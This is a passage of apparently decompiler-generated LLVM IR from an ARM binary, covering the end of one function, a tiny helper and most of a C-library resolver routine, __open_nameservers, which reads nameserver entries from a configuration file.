dec_label_pc_19314:                               ; preds = %dec_label_pc_18c44, %dec_label_pc_192f4.backedge, %dec_label_pc_192f8.outer.backedge, %bb200, %dec_label_pc_18dcc, %dec_label_pc_192f8.backedge, %dec_label_pc_19308
  %stack_var_-216.2 = phi i32 [ -1, %dec_label_pc_19308 ], [ %v0_18e8c, %dec_label_pc_192f8.backedge ], [ %v1_18ce4, %dec_label_pc_18dcc ], [ %v1_18ce4, %bb200 ], [ %v0_18e8c, %dec_label_pc_192f8.outer.backedge ], [ -1, %dec_label_pc_18c44 ], [ %v0_18e8c, %dec_label_pc_192f4.backedge ]
  %v0_19314 = call i32 @__GI___h_errno_location()
  %v2_1931c = inttoptr i32 %v0_19314 to i32*
  store i32 -1, i32* %v2_1931c, align 4
  %v0_19320 = load i32, i32* @sb, align 4
  store i32 %v0_19320, i32* @r6, align 4
  br label %dec_label_pc_19324

dec_label_pc_19324:                               ; preds = %dec_label_pc_19010, %dec_label_pc_19314
  %v1_1932c = phi i32 [ %stack_var_-216.2, %dec_label_pc_19314 ], [ %v0_18e8c, %dec_label_pc_19010 ]
  %v7_19328 = icmp eq i32 %v1_1932c, -1
  br i1 %v7_19328, label %bb209, label %bb208

bb208:                                            ; preds = %dec_label_pc_19324
  br label %bb209

bb209:                                            ; preds = %dec_label_pc_19324, %bb208
  store i32 103220, i32* @lr, align 4
  %v1_19330 = xor i1 %v7_19328, true
  call void @__pseudo_cond_branch(i1 %v1_19330, i32 ptrtoint (i32* @global_var_12e38.1138 to i32))
  %v2_19334 = load i32, i32* %stack_var_-236, align 4
  store i32 %v2_19334, i32* @r0, align 4
  %v0_19338 = call i32 @free()
  %v0_1933c = load i32, i32* @r7, align 4
  store i32 %v0_1933c, i32* @r0, align 4
  %v0_19340 = call i32 @free()
  %v0_19344 = load i32, i32* @sl, align 4
  %v7_19344 = icmp eq i32 %v0_19344, -1
  br i1 %v7_19344, label %bb210, label %dec_label_pc_19350

bb210:                                            ; preds = %bb209
  br label %dec_label_pc_193ac

dec_label_pc_19350:                               ; preds = %bb209
  %v2_19350 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_19350, i32* @r0, align 4
  %v1_19368 = call i32 @__pthread_return_void()
  %v1_19378 = call i32 @__pthread_return_0()
  %v0_19384 = load i32, i32* @r6, align 4
  %v3_19384 = sdiv i32 %v0_19384, 256
  %v0_19388 = load i32, i32* @sl, align 4
  store i32 %v0_19388, i32* @global_var_2cad8.1133, align 4
  store i32 %v2_19350, i32* @r0, align 4
  %v1_19394 = trunc i32 %v3_19384 to i8
  store i8 %v1_19394, i8* @global_var_26829.1136, align 1
  %v1_19398 = trunc i32 %v0_19384 to i8
  store i8 %v1_19398, i8* bitcast (i8** @global_var_26828.1135 to i8*), align 4
  store i32 103336, i32* @lr, align 4
  %v1_193a4 = call i32 @__pthread_return_void()
  br label %dec_label_pc_193ac

dec_label_pc_193ac:                               ; preds = %bb210, %bb207, %dec_label_pc_19350
  %v0_193ac = phi i32 [ %v0_19344, %bb210 ], [ %v0_193ac.pre, %bb207 ], [ -1, %dec_label_pc_19350 ]
  store i32 %v3_18be0, i32* @r4, align 4
  store i32 %v6_18be0, i32* @r5, align 4
  store i32 %v9_18be0, i32* @r6, align 4
  store i32 %v12_18be0, i32* @r7, align 4
  store i32 %v15_18be0, i32* @r8, align 4
  store i32 %v18_18be0, i32* @sb, align 4
  store i32 %v21_18be0, i32* @sl, align 4
  ret i32 %v0_193ac

; uselistorder directives
  uselistorder i32 %v0_19384, { 1, 0 }
  uselistorder i32 %v0_19344, { 1, 0 }
  uselistorder i1 %v7_19328, { 1, 0 }
  uselistorder i32 %v6_192bc, { 2, 6, 3, 4, 1, 5, 0 }
  uselistorder i32 %stack_var_-208.5.ph.be, { 1, 0 }
  uselistorder i32 %v0_19200, { 1, 0 }
  uselistorder i32 %stack_var_-192.0, { 6, 1, 2, 5, 0, 3, 4 }
  uselistorder i32 %stack_var_-212.2, { 1, 0 }
  uselistorder i32 %v0_19054, { 0, 1, 3, 2 }
  uselistorder i32 %v0_1914c, { 0, 2, 1, 3 }
  uselistorder i32 %v1_1910c, { 1, 0 }
  uselistorder i32 %v0_1902c, { 1, 0 }
  uselistorder i32 %v0_19030, { 1, 0 }
  uselistorder i32 %v6_18f30, { 1, 0 }
  uselistorder i32 %v0_18e8c, { 5, 0, 1, 2, 3, 4, 6, 8, 7, 10, 9, 12, 13, 11 }
  uselistorder i32 %v1_18df8, { 1, 0 }
  uselistorder i32 %v2_18d98, { 1, 0 }
  uselistorder i32 %v1_18d10, { 1, 2, 0 }
  uselistorder i1 %v7_18ce0, { 1, 0 }
  uselistorder i32 %stack_var_-208.567, { 2, 1, 4, 5, 3, 0 }
  uselistorder i32 %v1_18ce4, { 1, 2, 0 }
  uselistorder i32 %v0_18cd4, { 1, 0 }
  uselistorder i32 %v2_18c58, { 6, 7, 8, 0, 1, 2, 3, 4, 5, 9, 10, 11, 12, 13 }
  uselistorder i32* %stack_var_-236, { 1, 2, 3, 4, 5, 0, 6 }
  uselistorder i8* %stack_var_-188, { 4, 3, 1, 0, 2 }
  uselistorder i8* %stack_var_-100, { 3, 0, 2, 1 }
  uselistorder i32* %stack_var_-44, { 1, 0 }
  uselistorder i32* %stack_var_-140, { 1, 0, 2 }
  uselistorder i32* %stack_var_0, { 1, 0 }
  uselistorder i32 %tmp155, { 2, 0, 4, 1, 3 }
  uselistorder i32 %tmp146, { 1, 0, 2 }
  uselistorder i32 %tmp, { 2, 1, 0 }
  uselistorder i32 (i32)* @__libc_close, { 15, 16, 23, 22, 21, 20, 19, 18, 13, 17, 14, 12, 11, 1, 0, 10, 9, 8, 7, 6, 5, 4, 3, 2 }
  uselistorder i32 (i32, i32*, i32, i32)* @__libc_send, { 8, 7, 0, 1, 2, 3, 4, 5, 6, 9, 10, 11, 12 }
  uselistorder i32 101, { 5, 1, 2, 3, 0, 4, 6 }
  uselistorder i32 (i32, %sockaddr*, i32)* @__libc_connect, { 4, 1, 2, 3, 0, 5, 6 }
  uselistorder i32 ()* @socket, { 2, 10, 9, 8, 7, 6, 5, 4, 3, 0, 1 }
  uselistorder i32 (i32)* @inet_addr, { 2, 4, 3, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @strncpy, { 2, 1, 0, 3 }
  uselistorder i8* @global_var_26829.1136, { 2, 1, 0 }
  uselistorder i32 512, { 3, 14, 2, 15, 1, 10, 11, 12, 13, 0, 6, 7, 5, 8, 4, 9, 16 }
  uselistorder i32 %arg2, { 2, 4, 5, 0, 1, 3 }
  uselistorder label %dec_label_pc_193ac, { 2, 0, 1 }
  uselistorder label %bb209, { 1, 0 }
  uselistorder label %dec_label_pc_19324, { 1, 0 }
  uselistorder label %dec_label_pc_19314, { 6, 1, 2, 5, 4, 3, 0 }
  uselistorder label %dec_label_pc_19308, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_18cdc.lr.ph.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_192f4.backedge, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1925c, { 6, 2, 3, 0, 4, 1, 5 }
  uselistorder label %dec_label_pc_192f8.outer.backedge, { 1, 0, 2 }
  uselistorder label %dec_label_pc_19228, { 1, 0 }
  uselistorder label %bb207, { 1, 0 }
  uselistorder label %dec_label_pc_191a8, { 4, 2, 1, 3, 0 }
  uselistorder label %bb205, { 1, 0 }
  uselistorder label %dec_label_pc_19194, { 1, 0 }
  uselistorder label %dec_label_pc_19180, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1917c, { 1, 0 }
  uselistorder label %dec_label_pc_190e4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_19020, { 1, 0 }
  uselistorder label %dec_label_pc_19010, { 1, 0 }
  uselistorder label %dec_label_pc_192f8.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_18e78, { 1, 0 }
  uselistorder label %.thread11, { 1, 0 }
  uselistorder label %dec_label_pc_18dcc, { 2, 0, 1 }
  uselistorder label %bb200, { 1, 0 }
}

define i32 @"$d"(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_193b8:
  %v0_193b8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_193b8, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_193b8
  %v5_193b8 = mul i32 %arg2, 256
  %v6_193b8 = and i32 %v5_193b8, %arg1
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_193b8, %bb
  %v10_193e8 = phi i32 [ %arg1, %dec_label_pc_193b8 ], [ %v6_193b8, %bb ]
  ret i32 %v10_193e8

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @__open_nameservers(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-192 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_193ec = load i32, i32* @r4, align 4
  store i32 %v3_193ec, i32* %stack_var_-28, align 4
  %v6_193ec = load i32, i32* @r5, align 4
  %v9_193ec = load i32, i32* @r6, align 4
  %v12_193ec = load i32, i32* @r7, align 4
  %v15_193ec = load i32, i32* @r8, align 4
  %v18_193ec = load i32, i32* @sl, align 4
  %v2_193f0 = ptrtoint i32* %stack_var_-192 to i32
  %v2_193f4 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_193f4, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_2682c.972 to i32), i32* %r2.global-to-local, align 4
  %v1_19408 = call i32 @__pthread_return_void()
  store i32 ptrtoint (i32* @global_var_2682c.972 to i32), i32* %r0.global-to-local, align 4
  store i32 103452, i32* @lr, align 4
  %v1_19418 = call i32 @__pthread_return_0()
  store i32 %v1_19418, i32* %r0.global-to-local, align 4
  %v2_19420 = load i32, i32* @global_var_2cba4.977, align 4
  %v5_19428 = icmp sgt i32 %v2_19420, 0
  br i1 %v5_19428, label %dec_label_pc_19664, label %dec_label_pc_1942c

dec_label_pc_1942c:                               ; preds = %entry
  store i32 ptrtoint ([17 x i8]* @global_var_1e204.1154 to i32), i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_1e218.1156 to i32), i32* @r1, align 4
  %v3_19434 = call i32 @__GI_fopen(i32 ptrtoint ([17 x i8]* @global_var_1e204.1154 to i32), i32 ptrtoint (i32* @global_var_1e218.1156 to i32))
  store i32 %v3_19434, i32* %r0.global-to-local, align 4
  store i32 %v3_19434, i32* @sl, align 4
  %v2_19438 = icmp eq i32 %v3_19434, 0
  br i1 %v2_19438, label %dec_label_pc_19440, label %dec_label_pc_1962c.preheader

dec_label_pc_19440:                               ; preds = %dec_label_pc_1942c
  store i32 ptrtoint ([24 x i8]* @global_var_1e21c.1158 to i32), i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_1e218.1156 to i32), i32* @r1, align 4
  %v3_19448 = call i32 @__GI_fopen(i32 ptrtoint ([24 x i8]* @global_var_1e21c.1158 to i32), i32 ptrtoint (i32* @global_var_1e218.1156 to i32))
  store i32 %v3_19448, i32* %r0.global-to-local, align 4
  store i32 %v3_19448, i32* @sl, align 4
  %v2_1944c = icmp eq i32 %v3_19448, 0
  br i1 %v2_1944c, label %dec_label_pc_19658, label %dec_label_pc_1962c.preheader

dec_label_pc_1962c.preheader:                     ; preds = %dec_label_pc_1942c, %dec_label_pc_19440
  %v0_1963426 = phi i32 [ %v3_19434, %dec_label_pc_1942c ], [ %v3_19448, %dec_label_pc_19440 ]
  %v2_194a0 = ptrtoint i32* %stack_var_-28 to i32
  %v3_1953c = inttoptr i32 %tmp to i8*
  store i32 %v2_193f0, i32* %r0.global-to-local, align 4
  store i32 %v0_1963426, i32* %r2.global-to-local, align 4
  %v3_1963866 = call i32 @fgets(i32 %v2_193f0, i32 128, i32 %v0_1963426)
  store i32 %v3_1963866, i32* %r0.global-to-local, align 4
  %v2_1963c68 = icmp eq i32 %v3_1963866, 0
  store i32 %v2_193f0, i32* @r4, align 4
  br i1 %v2_1963c68, label %dec_label_pc_1964c, label %dec_label_pc_1945c.preheader.lr.ph

dec_label_pc_1945c.preheader.lr.ph:               ; preds = %dec_label_pc_1962c.preheader
  %v1_1945c11 = bitcast i32* %stack_var_-192 to i8*
  br label %dec_label_pc_1945c.preheader

dec_label_pc_19458:                               ; preds = %dec_label_pc_19468
  %v1_19458 = add i32 %v0_19458, 1
  store i32 %v1_19458, i32* %r0.global-to-local, align 4
  %v1_1945c = inttoptr i32 %v1_19458 to i8*
  %v2_1945c = load i8, i8* %v1_1945c, align 1
  %v3_1945c = zext i8 %v2_1945c to i32
  store i32 %v3_1945c, i32* %r2.global-to-local, align 4
  %v2_19460 = icmp eq i8 %v2_1945c, 0
  br i1 %v2_19460, label %dec_label_pc_1947c, label %dec_label_pc_19468

dec_label_pc_19468:                               ; preds = %dec_label_pc_19468.lr.ph, %dec_label_pc_19458
  %v0_19458 = phi i32 [ %v2_193f0, %dec_label_pc_19468.lr.ph ], [ %v1_19458, %dec_label_pc_19458 ]
  %v1_19470 = phi i32 [ %v3_1945c13, %dec_label_pc_19468.lr.ph ], [ %v3_1945c, %dec_label_pc_19458 ]
  %v3_19470 = mul nuw nsw i32 %v1_19470, 2
  %v4_19470 = add i32 %v3_19470, %v2_1946c.pre
  %v5_19470 = inttoptr i32 %v4_19470 to i8*
  %v6_19470 = load i8, i8* %v5_19470, align 1
  %v1_19474 = and i8 %v6_19470, 32
  %v2_19474 = icmp eq i8 %v1_19474, 0
  br i1 %v2_19474, label %dec_label_pc_1947c, label %dec_label_pc_19458

dec_label_pc_1947c:                               ; preds = %dec_label_pc_19458, %dec_label_pc_19468, %dec_label_pc_1945c.preheader
  %v0_1951435 = phi i32 [ %v2_193f0, %dec_label_pc_1945c.preheader ], [ %v1_19458, %dec_label_pc_19458 ], [ %v0_19458, %dec_label_pc_19468 ]
  %v0_19490 = phi i32 [ %v3_1945c13, %dec_label_pc_1945c.preheader ], [ %v3_1945c, %dec_label_pc_19458 ], [ %v1_19470, %dec_label_pc_19468 ]
  %v7_1947c = icmp eq i32 %v0_19490, 10
  br i1 %v7_1947c, label %.thread3, label %bb

bb:                                               ; preds = %dec_label_pc_1947c
  %v3_19480 = icmp eq i32 %v0_19490, 0
  br i1 %v3_19480, label %bb55, label %dec_label_pc_19490

.thread3:                                         ; preds = %dec_label_pc_1947c
  br label %dec_label_pc_1962c.backedge

bb55:                                             ; preds = %bb
  br label %dec_label_pc_1962c.backedge

dec_label_pc_1962c.backedge:                      ; preds = %dec_label_pc_19608, %dec_label_pc_19620, %bb55, %dec_label_pc_195a0, %.thread3, %dec_label_pc_19490
  %v0_19634.pre = load i32, i32* @sl, align 4
  store i32 %v2_193f0, i32* %r0.global-to-local, align 4
  store i32 %v0_19634.pre, i32* %r2.global-to-local, align 4
  %v3_19638 = call i32 @fgets(i32 %v2_193f0, i32 128, i32 %v0_19634.pre)
  store i32 %v3_19638, i32* %r0.global-to-local, align 4
  %v2_1963c = icmp eq i32 %v3_19638, 0
  store i32 %v2_193f0, i32* @r4, align 4
  br i1 %v2_1963c, label %dec_label_pc_1964c, label %dec_label_pc_1945c.preheader

dec_label_pc_19490:                               ; preds = %bb
  %v7_19490 = icmp eq i32 %v0_19490, 35
  br i1 %v7_19490, label %dec_label_pc_1962c.backedge, label %dec_label_pc_19514

dec_label_pc_194a0:                               ; preds = %bb58
  store i32 %v2_194a0, i32* %r2.global-to-local, align 4
  %v4_194a4 = mul i32 %storemerge, 4
  %v5_194a4 = add i32 %v4_194a4, %v2_194a0
  %v2_194a8 = add i32 %v5_194a4, -36
  %v3_194a8 = inttoptr i32 %v2_194a8 to i32*
  store i32 %v0_194a8, i32* %v3_194a8, align 4
  %v0_194b415 = load i32, i32* %r0.global-to-local, align 4
  %v1_194b416 = inttoptr i32 %v0_194b415 to i8*
  %v2_194b417 = load i8, i8* %v1_194b416, align 1
  %v3_194b418 = zext i8 %v2_194b417 to i32
  store i32 %v3_194b418, i32* %r2.global-to-local, align 4
  %v2_194b819 = icmp eq i8 %v2_194b417, 0
  br i1 %v2_194b819, label %dec_label_pc_194e8.preheader, label %dec_label_pc_194c0.lr.ph

dec_label_pc_194c0.lr.ph:                         ; preds = %dec_label_pc_194a0
  %v2_194c4.pre = load i32, i32* @global_var_264e8, align 4
  br label %dec_label_pc_194c0

dec_label_pc_194b0:                               ; preds = %dec_label_pc_194d4
  %v1_194b0 = add i32 %v0_194b0, 1
  store i32 %v1_194b0, i32* %r0.global-to-local, align 4
  %v1_194b4 = inttoptr i32 %v1_194b0 to i8*
  %v2_194b4 = load i8, i8* %v1_194b4, align 1
  %v3_194b4 = zext i8 %v2_194b4 to i32
  store i32 %v3_194b4, i32* %r2.global-to-local, align 4
  %v2_194b8 = icmp eq i8 %v2_194b4, 0
  br i1 %v2_194b8, label %dec_label_pc_194e8.preheader, label %dec_label_pc_194c0

dec_label_pc_194c0:                               ; preds = %dec_label_pc_194c0.lr.ph, %dec_label_pc_194b0
  %v0_194b0 = phi i32 [ %v0_194b415, %dec_label_pc_194c0.lr.ph ], [ %v1_194b0, %dec_label_pc_194b0 ]
  %v0_194d4 = phi i32 [ %v3_194b418, %dec_label_pc_194c0.lr.ph ], [ %v3_194b4, %dec_label_pc_194b0 ]
  %v3_194c8 = mul nuw nsw i32 %v0_194d4, 2
  %v4_194c8 = add i32 %v3_194c8, %v2_194c4.pre
  %v5_194c8 = inttoptr i32 %v4_194c8 to i8*
  %v6_194c8 = load i8, i8* %v5_194c8, align 1
  %v1_194cc = and i8 %v6_194c8, 32
  %v2_194cc = icmp eq i8 %v1_194cc, 0
  br i1 %v2_194cc, label %dec_label_pc_194d4, label %dec_label_pc_194e8.preheader

dec_label_pc_194d4:                               ; preds = %dec_label_pc_194c0
  %v7_194d4 = icmp eq i32 %v0_194d4, 10
  br i1 %v7_194d4, label %dec_label_pc_194e8.preheader, label %dec_label_pc_194b0

dec_label_pc_194e8.preheader:                     ; preds = %dec_label_pc_194d4, %dec_label_pc_194c0, %dec_label_pc_194b0, %dec_label_pc_194a0
  %v0_194e820 = phi i32 [ %v0_194b415, %dec_label_pc_194a0 ], [ %v0_194b0, %dec_label_pc_194d4 ], [ %v0_194b0, %dec_label_pc_194c0 ], [ %v1_194b0, %dec_label_pc_194b0 ]
  %v1_194e821 = inttoptr i32 %v0_194e820 to i8*
  %v2_194e822 = load i8, i8* %v1_194e821, align 1
  %v3_194e823 = zext i8 %v2_194e822 to i32
  store i32 %v3_194e823, i32* %r2.global-to-local, align 4
  %v2_194ec24 = icmp eq i8 %v2_194e822, 0
  br i1 %v2_194ec24, label %dec_label_pc_19510, label %dec_label_pc_194f4

dec_label_pc_194e0:                               ; preds = %dec_label_pc_194f4, %dec_label_pc_19508
  %v3_194e4 = inttoptr i32 %v2_194e4 to i8*
  store i8 0, i8* %v3_194e4, align 1
  %v4_194e4 = load i32, i32* %r0.global-to-local, align 4
  %v5_194e4 = add i32 %v4_194e4, 1
  store i32 %v5_194e4, i32* %r0.global-to-local, align 4
  %v1_194e8 = inttoptr i32 %v5_194e4 to i8*
  %v2_194e8 = load i8, i8* %v1_194e8, align 1
  %v3_194e8 = zext i8 %v2_194e8 to i32
  store i32 %v3_194e8, i32* %r2.global-to-local, align 4
  %v2_194ec = icmp eq i8 %v2_194e8, 0
  br i1 %v2_194ec, label %dec_label_pc_19510, label %dec_label_pc_194f4

dec_label_pc_194f4:                               ; preds = %dec_label_pc_194e8.preheader, %dec_label_pc_194e0
  %v0_19508 = phi i32 [ %v3_194e8, %dec_label_pc_194e0 ], [ %v3_194e823, %dec_label_pc_194e8.preheader ]
  %v2_194e4 = phi i32 [ %v5_194e4, %dec_label_pc_194e0 ], [ %v0_194e820, %dec_label_pc_194e8.preheader ]
  %v2_194f8 = load i32, i32* @global_var_264e8, align 4
  %v3_194fc = mul nuw nsw i32 %v0_19508, 2
  %v4_194fc = add i32 %v2_194f8, %v3_194fc
  %v5_194fc = inttoptr i32 %v4_194fc to i8*
  %v6_194fc = load i8, i8* %v5_194fc, align 1
  %v1_19500 = and i8 %v6_194fc, 32
  %v2_19500 = icmp eq i8 %v1_19500, 0
  br i1 %v2_19500, label %dec_label_pc_19508, label %dec_label_pc_194e0

dec_label_pc_19508:                               ; preds = %dec_label_pc_194f4
  %v7_19508 = icmp eq i32 %v0_19508, 10
  br i1 %v7_19508, label %dec_label_pc_194e0, label %dec_label_pc_19510

dec_label_pc_19510:                               ; preds = %dec_label_pc_194e0, %dec_label_pc_19508, %dec_label_pc_194e8.preheader
  %v0_1951434 = phi i32 [ %v0_194e820, %dec_label_pc_194e8.preheader ], [ %v5_194e4, %dec_label_pc_194e0 ], [ %v2_194e4, %dec_label_pc_19508 ]
  %v0_19510 = load i32, i32* @r8, align 4
  %v1_19510 = add i32 %v0_19510, 1
  br label %dec_label_pc_19514

dec_label_pc_19514:                               ; preds = %dec_label_pc_19490, %dec_label_pc_19510
  %storemerge = phi i32 [ %v1_19510, %dec_label_pc_19510 ], [ 0, %dec_label_pc_19490 ]
  %v0_194a8 = phi i32 [ %v0_1951434, %dec_label_pc_19510 ], [ %v0_1951435, %dec_label_pc_19490 ]
  store i32 %storemerge, i32* @r8, align 4
  %v1_19514 = inttoptr i32 %v0_194a8 to i8*
  %v2_19514 = load i8, i8* %v1_19514, align 1
  %v3_19514 = zext i8 %v2_19514 to i32
  %v2_19518 = icmp eq i8 %v2_19514, 0
  br i1 %v2_19518, label %bb57, label %bb56

bb56:                                             ; preds = %dec_label_pc_19514
  br label %bb57

bb57:                                             ; preds = %dec_label_pc_19514, %bb56
  %v0_19528.pr = phi i32 [ %v3_19514, %dec_label_pc_19514 ], [ 1, %bb56 ]
  %v1_19520 = add i32 %storemerge, -4
  %v3_19520 = sub i32 3, %storemerge
  %v4_19520 = and i32 %v3_19520, %storemerge
  %v5_19520 = icmp slt i32 %v4_19520, 0
  %v6_19520 = icmp slt i32 %v1_19520, 0
  %v7_19520 = icmp eq i32 %storemerge, 4
  %v3_19524 = xor i1 %v6_19520, %v5_19520
  %v4_19524 = or i1 %v7_19520, %v3_19524
  br i1 %v4_19524, label %bb58, label %.thread5

.thread5:                                         ; preds = %bb57
  br label %dec_label_pc_19530

bb58:                                             ; preds = %bb57
  %v2_19528 = icmp eq i32 %v0_19528.pr, 0
  br i1 %v2_19528, label %dec_label_pc_19530, label %dec_label_pc_194a0

dec_label_pc_19530:                               ; preds = %bb58, %.thread5
  store i32 %tmp, i32* @r6, align 4
  store i32 ptrtoint ([11 x i8]* @global_var_1e234.1161 to i32), i32* @r1, align 4
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v4_1953c = call i32 @__GI_strcoll(i8* %v3_1953c, i32 ptrtoint ([11 x i8]* @global_var_1e234.1161 to i32))
  store i32 %v4_1953c, i32* %r0.global-to-local, align 4
  %v2_19540 = icmp eq i32 %v4_1953c, 0
  br i1 %v2_19540, label %dec_label_pc_19568.preheader, label %dec_label_pc_1958c

dec_label_pc_19568.preheader:                     ; preds = %dec_label_pc_19530
  br label %dec_label_pc_19568

dec_label_pc_19550:                               ; preds = %dec_label_pc_19580
  %v1_19550 = add i32 %v5_19570, -36
  %v2_19550 = inttoptr i32 %v1_19550 to i32*
  %v3_19550 = load i32, i32* %v2_19550, align 4
  store i32 %v3_19550, i32* %r0.global-to-local, align 4
  %v1_19554 = inttoptr i32 %v3_19550 to i8*
  %v2_19554 = call i32 @__GI_strdup(i8* %v1_19554)
  store i32 %v2_19554, i32* %r0.global-to-local, align 4
  %v0_1955c = load i32, i32* @r4, align 4
  %v1_1955c = add i32 %v0_1955c, 1
  store i32 %v1_1955c, i32* %r2.global-to-local, align 4
  %v5_19560 = mul i32 %v0_1955c, 4
  %v6_19560 = add i32 %v5_19560, ptrtoint (i32* @global_var_2cb98.980 to i32)
  %v7_19560 = inttoptr i32 %v6_19560 to i32*
  store i32 %v2_19554, i32* %v7_19560, align 4
  %v0_19564 = load i32, i32* %r2.global-to-local, align 4
  %v1_19564 = load i32, i32* @r7, align 4
  %v2_19564 = inttoptr i32 %v1_19564 to i32*
  store i32 %v0_19564, i32* %v2_19564, align 4
  %v0_1956c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_19568

dec_label_pc_19568:                               ; preds = %dec_label_pc_19568.preheader, %dec_label_pc_19550
  %v0_19578 = phi i32 [ 1, %dec_label_pc_19568.preheader ], [ %v0_1956c.pre, %dec_label_pc_19550 ]
  store i32 %v2_194a0, i32* %r2.global-to-local, align 4
  %v1_1956c = load i32, i32* @r8, align 4
  %v2_1956c = sub i32 %v0_19578, %v1_1956c
  %v4_1956c = xor i32 %v1_1956c, %v0_19578
  %v5_1956c = xor i32 %v2_1956c, %v0_19578
  %v6_1956c = and i32 %v5_1956c, %v4_1956c
  %v7_1956c = icmp slt i32 %v6_1956c, 0
  %v8_1956c = icmp slt i32 %v2_1956c, 0
  %v4_19570 = mul i32 %v0_19578, 4
  %v5_19570 = add i32 %v4_19570, %v2_194a0
  store i32 ptrtoint (i32* @global_var_2cba4.977 to i32), i32* @r7, align 4
  %v1_19578 = add i32 %v0_19578, 1
  store i32 %v1_19578, i32* @r5, align 4
  %v2_1957c = xor i1 %v8_1956c, %v7_1956c
  br i1 %v2_1957c, label %dec_label_pc_19580, label %dec_label_pc_1958c

dec_label_pc_19580:                               ; preds = %dec_label_pc_19568
  %v2_19580 = load i32, i32* @global_var_2cba4.977, align 4
  store i32 %v2_19580, i32* @r4, align 4
  %v7_19588 = icmp slt i32 %v2_19580, 3
  br i1 %v7_19588, label %dec_label_pc_19550, label %dec_label_pc_1958c

dec_label_pc_1958c:                               ; preds = %dec_label_pc_19568, %dec_label_pc_19580, %dec_label_pc_19530
  %v0_1958c = load i32, i32* @r6, align 4
  store i32 %v0_1958c, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_1e240.1164 to i32), i32* @r1, align 4
  %v3_19594 = inttoptr i32 %v0_1958c to i8*
  %v4_19594 = call i32 @__GI_strcoll(i8* %v3_19594, i32 ptrtoint ([7 x i8]* @global_var_1e240.1164 to i32))
  store i32 %v4_19594, i32* %r0.global-to-local, align 4
  %v2_19598 = icmp eq i32 %v4_19594, 0
  br i1 %v2_19598, label %dec_label_pc_195d0.preheader, label %dec_label_pc_195a0

dec_label_pc_195a0:                               ; preds = %dec_label_pc_1958c
  %v0_195a0 = load i32, i32* @r6, align 4
  store i32 %v0_195a0, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_1e248.1166 to i32), i32* @r1, align 4
  %v3_195a8 = inttoptr i32 %v0_195a0 to i8*
  %v4_195a8 = call i32 @__GI_strcoll(i8* %v3_195a8, i32 ptrtoint ([7 x i8]* @global_var_1e248.1166 to i32))
  store i32 %v4_195a8, i32* %r0.global-to-local, align 4
  %v2_195ac = icmp eq i32 %v4_195a8, 0
  br i1 %v2_195ac, label %dec_label_pc_195d0.preheader, label %dec_label_pc_1962c.backedge

dec_label_pc_195d0.preheader:                     ; preds = %dec_label_pc_1958c, %dec_label_pc_195a0
  store i32 ptrtoint (i32* @global_var_2cba8.1141 to i32), i32* @r4, align 4
  %v2_195d460 = load i32, i32* @global_var_2cba8.1141, align 4
  store i32 ptrtoint (i32* @global_var_2cb88.1145 to i32), i32* @r5, align 4
  %v1_195e063 = add i32 %v2_195d460, -1
  store i32 %v1_195e063, i32* %r2.global-to-local, align 4
  %tmp5964 = icmp slt i32 %v2_195d460, 1
  br i1 %tmp5964, label %dec_label_pc_195e8, label %dec_label_pc_195b8

dec_label_pc_195b8:                               ; preds = %dec_label_pc_195d0.preheader, %dec_label_pc_195b8
  %v1_195e065 = phi i32 [ %v1_195e0, %dec_label_pc_195b8 ], [ %v1_195e063, %dec_label_pc_195d0.preheader ]
  %v4_195b8 = mul i32 %v1_195e065, 4
  %v5_195b8 = add i32 %v4_195b8, ptrtoint (i32* @global_var_2cb88.1145 to i32)
  %v6_195b8 = inttoptr i32 %v5_195b8 to i32*
  %v7_195b8 = load i32, i32* %v6_195b8, align 4
  store i32 %v7_195b8, i32* @r0, align 4
  store i32 %v1_195e065, i32* @global_var_2cba8.1141, align 4
  %v0_195c0 = call i32 @free()
  store i32 %v0_195c0, i32* %r0.global-to-local, align 4
  %v0_195c4 = load i32, i32* @r4, align 4
  %v1_195c4 = inttoptr i32 %v0_195c4 to i32*
  %v2_195c4 = load i32, i32* %v1_195c4, align 4
  %v1_195cc = load i32, i32* @r5, align 4
  %v5_195cc = mul i32 %v2_195c4, 4
  %v6_195cc = add i32 %v1_195cc, %v5_195cc
  %v7_195cc = inttoptr i32 %v6_195cc to i32*
  store i32 0, i32* %v7_195cc, align 4
  store i32 ptrtoint (i32* @global_var_2cba8.1141 to i32), i32* @r4, align 4
  %v2_195d4 = load i32, i32* @global_var_2cba8.1141, align 4
  store i32 ptrtoint (i32* @global_var_2cb88.1145 to i32), i32* @r5, align 4
  %v1_195e0 = add i32 %v2_195d4, -1
  store i32 %v1_195e0, i32* %r2.global-to-local, align 4
  %tmp59 = icmp slt i32 %v2_195d4, 1
  br i1 %tmp59, label %dec_label_pc_195e8, label %dec_label_pc_195b8

dec_label_pc_195e8:                               ; preds = %dec_label_pc_195b8, %dec_label_pc_195d0.preheader
  br label %dec_label_pc_19608

dec_label_pc_195f0:                               ; preds = %dec_label_pc_19620
  %v1_195f0 = add i32 %v5_19610, -36
  %v2_195f0 = inttoptr i32 %v1_195f0 to i32*
  %v3_195f0 = load i32, i32* %v2_195f0, align 4
